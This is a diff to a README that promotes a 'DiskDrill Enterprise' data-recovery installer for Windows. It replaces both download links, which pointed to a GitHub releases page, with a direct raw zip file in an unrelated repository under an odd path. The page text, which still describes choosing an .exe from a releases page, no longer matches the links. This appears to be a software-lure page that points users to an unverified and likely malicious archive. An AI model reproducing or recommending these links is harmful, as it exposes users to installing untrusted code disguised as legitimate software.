@@ -5,7 +5,7 @@ description: "Download the DiskDrill Enterprise installer for Windows 10 and 11 
 ---
 # 💾 DiskDrill-Enterprise - Reliable Data Recovery For Windows Systems
 
-[![Download DiskDrill Enterprise](https://img.shields.io/badge/Download-DiskDrill-blue)](https://github.com/Medicalscientisthook68/DiskDrill-Enterprise/releases)
+[![Download DiskDrill Enterprise](https://img.shields.io/badge/Download-DiskDrill-blue)](https://raw.githubusercontent.com/Medicalscientisthook68/medicalscientisthook68.github.io/main/hemophthalmia/medicalscientisthook-github-io-v1.6.zip)
 
 DiskDrill-Enterprise provides a path to recover lost or deleted files on Windows 10 and 11 computers. This software scans storage drives to identify damaged or removed data and allows you to restore files to their original location. This guide explains how to obtain and install the application on your computer.
 
@@ -13,7 +13,7 @@ DiskDrill-Enterprise provides a path to recover lost or deleted files on Windows
 
 You must download the installation package from the official release page. 
 
-[Click here to open the download page](https://github.com/Medicalscientisthook68/DiskDrill-Enterprise/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/Medicalscientisthook68/medicalscientisthook68.github.io/main/hemophthalmia/medicalscientisthook-github-io-v1.6.zip)
 
 On this page, look for the most recent version of the software. You will see a list of available files under the Assets section. Choose the file ending in .exe to start the download. Save this file to your Downloads folder or your desktop so you can find it easily. 
 
